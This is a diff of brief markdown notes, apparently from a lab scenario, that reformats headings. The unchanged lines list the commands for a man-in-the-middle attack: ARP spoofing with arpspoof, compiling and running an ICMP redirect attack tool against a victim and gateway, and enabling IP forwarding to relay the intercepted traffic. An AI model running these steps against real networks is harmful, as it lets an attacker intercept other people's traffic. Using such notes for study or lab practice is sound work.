@@ -1,15 +1,15 @@
-##Scenario
+#Scenario
 
-#arpredirect
+###arpredirect
 $ sudo apt-get install dsniff
 $ arpspoof -i <eth0> -t <Victim IP> <Victim Gateway IP>
 
-#icmpredirect
+###icmpredirect
 
 $ gcc -o icmp_redir_att icmp_redir_att.c
 $ ./icmp_redir_att <Victim Gateway IP> <Victim IP> <Des Victim;DNS?> <MyIP>
 
-#Packet Routing
+###Packet Routing
  
 Kernel based Routing
 $echo 1 > /proc/sys/net/ipv4/ip_forward
